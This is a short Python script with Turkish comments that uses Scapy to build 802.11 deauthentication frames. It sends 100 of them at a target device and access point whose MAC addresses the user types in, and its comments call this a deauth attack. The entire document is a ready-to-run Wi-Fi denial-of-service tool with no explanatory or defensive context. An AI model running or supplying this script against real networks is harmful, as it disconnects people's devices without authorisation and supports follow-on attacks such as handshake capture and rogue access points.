import scapy.all as scapy

def deauth(target_mac, ap_mac):
    # Deauth paketi oluştur
    deauth_packet = scapy.RadioTap() / scapy.Dot11(
        type=0, subtype=12, addr1=target_mac, addr2=ap_mac, addr3=ap_mac
    )

    # Paketi gönder
    scapy.sendp(deauth_packet, iface="wlan0mon", count=100, inter=0.1)

if __name__ == "__main__":
    # Hedef MAC adresini girin
    target_mac = input("Hedef MAC adresini girin: ")

    # Erişim noktası MAC adresini girin
    ap_mac = input("Erişim noktası MAC adresini girin: ")

    # Deauth saldırısını başlat
    deauth(target_mac, ap_mac)
